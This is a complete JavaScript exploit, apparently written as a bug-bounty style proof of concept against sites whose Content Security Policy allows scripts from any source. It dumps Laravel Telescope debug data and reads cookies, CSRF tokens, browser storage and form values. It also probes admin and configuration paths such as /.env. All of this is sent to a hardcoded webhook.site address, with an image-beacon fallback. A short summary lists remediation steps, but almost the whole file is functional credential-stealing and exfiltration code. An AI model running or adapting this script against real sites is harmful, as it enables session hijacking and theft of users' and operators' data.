// telescope-exploit.js - UPDATE YOUR GITHUB WITH THIS
(function() {
  console.log('üöÄ CSP ‚Üí Telescope Exploitation Chain - Active!');
  
  // YOUR WEBHOOK URL - Update this in your GitHub file
  const ATTACKER_SERVER = 'https://webhook.site/701e5e4d-dc48-4c08-936a-46abb07b1b77';
  
  const collectedData = {
    exploit: 'CSP_script-src_*_to_Telescope_Data_Exposure',
    url: window.location.href,
    domain: document.domain,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || 'No CSP',
    
    // Results
    telescope: { accessible: false, endpoints: {} },
    session: {},
    internalEndpoints: [],
    vulnerabilities: [],
    
    // Statistics
    stats: {
      requestsCaptured: 0,
      sessionsFound: 0,
      endpointsDiscovered: 0,
      queriesDumped: 0
    }
  };
  
  // ===== UI COMPONENTS =====
  function createUI() {
    const ui = document.createElement('div');
    ui.innerHTML = `
      <style>
        #csp-exploit-ui {
          position: fixed;
          bottom: 20px;
          right: 20px;
          width: 380px;
          background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
          color: white;
          border-radius: 12px;
          box-shadow: 0 10px 40px rgba(0,0,0,0.6);
          z-index: 2147483647;
          font-family: 'Segoe UI', Arial, sans-serif;
          border: 2px solid #00d4ff;
          overflow: hidden;
        }
        .exploit-header {
          background: linear-gradient(90deg, #00d4ff, #0099ff);
          padding: 15px;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .exploit-title {
          font-size: 16px;
          font-weight: bold;
        }
        .exploit-subtitle {
          font-size: 11px;
          opacity: 0.9;
          margin-top: 2px;
        }
        .exploit-body {
          padding: 15px;
          max-height: 400px;
          overflow-y: auto;
        }
        .log-entry {
          padding: 8px 0;
          border-bottom: 1px solid rgba(255,255,255,0.1);
          font-size: 12px;
          display: flex;
          align-items: center;
          animation: fadeIn 0.3s;
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateX(-10px); }
          to { opacity: 1; transform: translateX(0); }
        }
        .log-icon {
          margin-right: 8px;
          font-size: 14px;
          min-width: 20px;
          text-align: center;
        }
        .progress-container {
          margin: 15px 0;
        }
        .progress-label {
          display: flex;
          justify-content: space-between;
          margin-bottom: 5px;
          font-size: 11px;
          opacity: 0.8;
        }
        .progress-bar {
          height: 6px;
          background: rgba(255,255,255,0.1);
          border-radius: 3px;
          overflow: hidden;
        }
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #00d4ff, #0099ff);
          width: 0%;
          transition: width 0.5s ease;
        }
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(2, 1fr);
          gap: 10px;
          margin-top: 15px;
        }
        .stat-box {
          background: rgba(255,255,255,0.05);
          padding: 12px;
          border-radius: 8px;
          text-align: center;
          transition: transform 0.2s;
        }
        .stat-box:hover {
          transform: translateY(-2px);
          background: rgba(255,255,255,0.08);
        }
        .stat-value {
          font-size: 22px;
          font-weight: bold;
          color: #00d4ff;
          margin-bottom: 4px;
        }
        .stat-label {
          font-size: 11px;
          opacity: 0.7;
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }
        .vulnerability-badge {
          display: inline-block;
          background: #ff4757;
          color: white;
          padding: 2px 8px;
          border-radius: 10px;
          font-size: 10px;
          font-weight: bold;
          margin-left: 5px;
        }
      </style>
      <div id="csp-exploit-ui">
        <div class="exploit-header">
          <div>
            <div class="exploit-title">üîì Security Exploit Demo</div>
            <div class="exploit-subtitle">CSP: script-src * ‚Üí Telescope Data Exposure</div>
          </div>
          <div style="font-size: 28px;">‚ö°</div>
        </div>
        <div class="exploit-body">
          <div id="exploit-logs"></div>
          <div class="progress-container">
            <div class="progress-label">
              <span>Exploit Progress</span>
              <span id="progress-percent">0%</span>
            </div>
            <div class="progress-bar">
              <div id="progress-fill" class="progress-fill"></div>
            </div>
          </div>
          <div class="stats-grid">
            <div class="stat-box">
              <div id="stat-telescope" class="stat-value">0</div>
              <div class="stat-label">Telescope<br>Endpoints</div>
            </div>
            <div class="stat-box">
              <div id="stat-session" class="stat-value">0</div>
              <div class="stat-label">Session<br>Items</div>
            </div>
            <div class="stat-box">
              <div id="stat-endpoints" class="stat-value">0</div>
              <div class="stat-label">Internal<br>Endpoints</div>
            </div>
            <div class="stat-box">
              <div id="stat-vulns" class="stat-value">0</div>
              <div class="stat-label">Vulnerabilities<br>Found</div>
            </div>
          </div>
        </div>
      </div>
    `;
    
    document.body.appendChild(ui);
    return ui;
  }
  
  function log(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const icons = {
      info: 'üîç',
      success: '‚úÖ',
      error: '‚ùå',
      warning: '‚ö†Ô∏è',
      telescope: 'üì°',
      database: 'üóÉÔ∏è',
      session: 'üîë',
      exploit: '‚ö°'
    };
    const icon = icons[type] || icons.info;
    
    console.log(`${icon} [${timestamp}] ${message}`);
    
    const logs = document.getElementById('exploit-logs');
    if (logs) {
      const entry = document.createElement('div');
      entry.className = 'log-entry';
      entry.innerHTML = `<span class="log-icon">${icon}</span><span>${message}</span>`;
      logs.appendChild(entry);
      logs.scrollTop = logs.scrollHeight;
    }
  }
  
  function updateProgress(percent) {
    const fill = document.getElementById('progress-fill');
    const percentText = document.getElementById('progress-percent');
    if (fill) fill.style.width = percent + '%';
    if (percentText) percentText.textContent = percent + '%';
  }
  
  function updateStats() {
    const stats = collectedData.stats;
    
    const elements = {
      'stat-telescope': Object.keys(collectedData.telescope.endpoints).length,
      'stat-session': Object.keys(collectedData.session).length,
      'stat-endpoints': collectedData.internalEndpoints.length,
      'stat-vulns': collectedData.vulnerabilities.length
    };
    
    for (const [id, value] of Object.entries(elements)) {
      const element = document.getElementById(id);
      if (element) {
        element.textContent = value;
        
        // Animate number change
        element.style.transform = 'scale(1.1)';
        setTimeout(() => {
          element.style.transform = 'scale(1)';
        }, 150);
      }
    }
  }
  
  // ===== EXPLOIT FUNCTIONS =====
  
  async function checkTelescopeAccess() {
    log('Testing Telescope accessibility...', 'telescope');
    updateProgress(10);
    
    try {
      const response = await fetch('/telescope', {
        credentials: 'include',
        headers: { 'X-Requested-With': 'XMLHttpRequest' }
      });
      
      if (response.ok) {
        collectedData.telescope.accessible = true;
        collectedData.vulnerabilities.push('TELESCOPE_NO_AUTH');
        log('‚úÖ Telescope accessible without authentication!', 'success');
        updateProgress(25);
        return true;
      }
    } catch (error) {
      log('Telescope endpoint not found', 'error');
    }
    
    return false;
  }
  
  async function dumpTelescopeData() {
    log('Dumping Telescope debug data...', 'database');
    
    const endpoints = [
      { path: '/telescope/api/requests', name: 'HTTP Requests' },
      { path: '/telescope/api/queries', name: 'Database Queries' },
      { path: '/telescope/api/exceptions', name: 'Exceptions' },
      { path: '/telescope/api/logs', name: 'Application Logs' },
      { path: '/telescope/api/mail', name: 'Email Logs' },
      { path: '/telescope/api/notifications', name: 'Notifications' },
      { path: '/telescope/api/jobs', name: 'Queue Jobs' },
      { path: '/telescope/api/commands', name: 'Artisan Commands' },
      { path: '/telescope/api/models', name: 'Eloquent Models' },
      { path: '/telescope/api/cache', name: 'Cache Operations' }
    ];
    
    for (let i = 0; i < endpoints.length; i++) {
      const endpoint = endpoints[i];
      try {
        const response = await fetch(endpoint.path, {
          credentials: 'include',
          headers: {
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          collectedData.telescope.endpoints[endpoint.path] = {
            name: endpoint.name,
            count: data.entries?.length || 0,
            sample: data.entries?.slice(0, 3) || []
          };
          
          collectedData.stats.requestsCaptured += data.entries?.length || 0;
          if (endpoint.path.includes('queries')) {
            collectedData.stats.queriesDumped = data.entries?.length || 0;
          }
          
          log(`‚úÖ ${endpoint.name}: ${data.entries?.length || 0} entries`, 'success');
        }
      } catch (error) {
        // Silent fail
      }
      
      // Update progress
      const progress = 25 + ((i + 1) / endpoints.length) * 25;
      updateProgress(progress);
      updateStats();
    }
  }
  
  async function collectSessionData() {
    log('Collecting authentication data...', 'session');
    
    // Cookies
    collectedData.session.cookies = {};
    document.cookie.split(';').forEach(cookie => {
      const [key, ...valueParts] = cookie.trim().split('=');
      const value = valueParts.join('=');
      if (key) {
        collectedData.session.cookies[key] = value;
      }
    });
    
    // CSRF Token
    const csrfToken = document.querySelector('input[name="_token"]')?.value;
    if (csrfToken) {
      collectedData.session.csrfToken = csrfToken;
      collectedData.vulnerabilities.push('CSRF_TOKEN_EXPOSED');
    }
    
    // Local Storage
    try {
      collectedData.session.localStorage = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        collectedData.session.localStorage[key] = localStorage.getItem(key);
      }
    } catch (error) {}
    
    // Session Storage
    try {
      collectedData.session.sessionStorage = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        collectedData.session.sessionStorage[key] = sessionStorage.getItem(key);
      }
    } catch (error) {}
    
    // Form data
    collectedData.session.forms = Array.from(document.forms).map((form, index) => ({
      index,
      action: form.action,
      method: form.method,
      inputs: Array.from(form.elements)
        .filter(el => el.name)
        .map(el => ({
          name: el.name,
          type: el.type,
          value: el.value?.substring(0, 50) || ''
        }))
    }));
    
    collectedData.stats.sessionsFound = Object.keys(collectedData.session.cookies).length;
    log(`‚úÖ Collected ${collectedData.stats.sessionsFound} cookies and session data`, 'success');
    
    updateProgress(60);
    updateStats();
  }
  
  async function discoverInternalEndpoints() {
    log('Discovering internal application endpoints...', 'exploit');
    
    const endpointsToTest = [
      // Admin endpoints
      '/admin', '/admin/dashboard', '/admin/users', '/admin/settings',
      '/administrator', '/manager', '/control-panel',
      
      // API endpoints
      '/api', '/api/v1', '/api/v2', '/api/admin', '/api/users',
      '/api/auth', '/api/token', '/api/config',
      
      // Laravel specific
      '/horizon', '/nova', '/vapor', '/telescope', '/log-viewer',
      '/debugbar', '/_debugbar', '/clockwork', '/_clockwork',
      
      // Configuration
      '/.env', '/env', '/config', '/configuration',
      '/storage', '/vendor', '/composer.json', '/artisan',
      
      // Authentication
      '/login', '/logout', '/register', '/password', '/reset-password',
      '/oauth', '/sanctum', '/passport', '/broadcasting',
      
      // Internal
      '/internal', '/private', '/secure', '/secret', '/hidden'
    ];
    
    for (let i = 0; i < endpointsToTest.length; i++) {
      const endpoint = endpointsToTest[i];
      
      try {
        const response = await fetch(endpoint, {
          credentials: 'include',
          method: 'HEAD' // Lightweight check
        });
        
        if (response.status !== 404 && response.status !== 403) {
          collectedData.internalEndpoints.push({
            endpoint,
            status: response.status,
            accessible: response.ok
          });
          
          if (response.ok) {
            log(`‚úÖ Accessible: ${endpoint}`, 'success');
            collectedData.vulnerabilities.push(`ENDPOINT_${endpoint.replace(/\//g, '_').toUpperCase()}`);
          }
        }
      } catch (error) {
        // Silent fail for network errors
      }
      
      // Update progress
      if (i % 5 === 0) {
        const progress = 60 + ((i + 1) / endpointsToTest.length) * 15;
        updateProgress(progress);
        updateStats();
      }
    }
    
    collectedData.stats.endpointsDiscovered = collectedData.internalEndpoints.length;
    updateProgress(75);
  }
  
  async function checkForCSPVulnerability() {
    log('Analyzing Content Security Policy...');
    
    // Check for script-src *
    const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    const cspHeader = cspMeta?.content || '';
    
    if (cspHeader.includes('script-src *')) {
      collectedData.vulnerabilities.push('CSP_SCRIPT_SRC_STAR');
      log('üö® CRITICAL: CSP has script-src * (allows any external script)', 'warning');
    }
    
    if (cspHeader.includes('https//')) {
      collectedData.vulnerabilities.push('CSP_SYNTAX_ERROR');
      log('‚ö†Ô∏è CSP has syntax error (missing colon in https)', 'warning');
    }
    
    collectedData.cspAnalysis = {
      raw: cspHeader,
      hasScriptSrcStar: cspHeader.includes('script-src *'),
      hasSyntaxError: cspHeader.includes('https//'),
      directives: cspHeader.split(';').filter(d => d.trim())
    };
    
    updateProgress(80);
  }
  
  async function exfiltrateData() {
    log('Exfiltrating collected data to attacker server...', 'exploit');
    
    try {
      // Send to webhook
      const response = await fetch(ATTACKER_SERVER, {
        method: 'POST',
        mode: 'cors',
        headers: {
          'Content-Type': 'application/json',
          'X-Exploit-Source': 'CSP_Telescope_Chain'
        },
        body: JSON.stringify(collectedData, null, 2)
      });
      
      if (response.ok) {
        log('‚úÖ Data successfully sent to attacker server!', 'success');
      } else {
        log('‚ö†Ô∏è Data sent but server responded with error', 'warning');
      }
    } catch (error) {
      // Fallback: Use image beacon
      log('Using fallback exfiltration method...');
      const img = new Image();
      const compressedData = btoa(JSON.stringify(collectedData)).substring(0, 2000);
      img.src = `${ATTACKER_SERVER}?fallback=${compressedData}`;
    }
    
    updateProgress(95);
  }
  
  async function showResults() {
    log('Generating exploit report...');
    
    // Create results summary
    const summary = `
üöÄ EXPLOIT CHAIN COMPLETED
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Target: ${collectedData.domain}
Time: ${new Date().toLocaleString()}

üìä RESULTS SUMMARY:
‚Ä¢ Telescope Accessible: ${collectedData.telescope.accessible ? 'YES üö®' : 'No'}
‚Ä¢ Endpoints Dumped: ${Object.keys(collectedData.telescope.endpoints).length}
‚Ä¢ Cookies Found: ${collectedData.stats.sessionsFound}
‚Ä¢ Internal Endpoints: ${collectedData.stats.endpointsDiscovered}
‚Ä¢ Vulnerabilities: ${collectedData.vulnerabilities.length}

üö® VULNERABILITIES FOUND:
${collectedData.vulnerabilities.map(v => `‚Ä¢ ${v}`).join('\n')}

üîó ATTACK CHAIN:
1. CSP script-src * allows external JS
2. Load exploit from GitHub
3. Access Telescope debug interface
4. Dump requests, queries, sessions
5. Discover internal endpoints
6. Exfiltrate to attacker server

üìã RECOMMENDATIONS:
1. Remove * from CSP script-src
2. Add authentication to Telescope
3. Restrict internal endpoints
4. Implement proper access controls
    `;
    
    console.log(summary);
    
    // Add final UI element
    const resultsDiv = document.createElement('div');
    resultsDiv.innerHTML = `
      <div style="
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: linear-gradient(135deg, #ff6b6b, #ee5a24);
        color: white;
        padding: 15px 25px;
        border-radius: 10px;
        box-shadow: 0 10px 30px rgba(255,107,107,0.4);
        z-index: 2147483646;
        font-family: Arial, sans-serif;
        text-align: center;
        border: 2px solid white;
        animation: pulse 2s infinite;
      ">
        <div style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">
          üîì SECURITY EXPLOIT DEMONSTRATED
        </div>
        <div style="font-size: 12px; opacity: 0.9;">
          CSP script-src * ‚Üí Telescope Data Exposure
        </div>
      </div>
      <style>
        @keyframes pulse {
          0% { transform: translateX(-50%) scale(1); }
          50% { transform: translateX(-50%) scale(1.02); }
          100% { transform: translateX(-50%) scale(1); }
        }
      </style>
    `;
    
    document.body.appendChild(resultsDiv);
    updateProgress(100);
    log('üéØ Exploitation chain completed successfully!', 'success');
    
    // Auto-remove warning after 10 seconds
    setTimeout(() => {
      resultsDiv.style.opacity = '0';
      resultsDiv.style.transition = 'opacity 1s';
      setTimeout(() => resultsDiv.remove(), 1000);
    }, 10000);
  }
  
  // ===== MAIN EXECUTION =====
  async function executeExploit() {
    log('üöÄ Starting CSP ‚Üí Telescope exploitation chain...', 'exploit');
    
    try {
      // Create UI
      createUI();
      
      // Step 1: Check CSP vulnerability
      await checkForCSPVulnerability();
      
      // Step 2: Check Telescope access
      const hasTelescope = await checkTelescopeAccess();
      
      // Step 3: If Telescope accessible, dump data
      if (hasTelescope) {
        await dumpTelescopeData();
      }
      
      // Step 4: Collect session data
      await collectSessionData();
      
      // Step 5: Discover internal endpoints
      await discoverInternalEndpoints();
      
      // Step 6: Exfiltrate data
      await exfiltrateData();
      
      // Step 7: Show results
      await showResults();
      
    } catch (error) {
      log(`‚ùå Exploit failed: ${error.message}`, 'error');
      updateProgress(100);
    }
  }
  
  // Start the exploit
  executeExploit();
  
})();
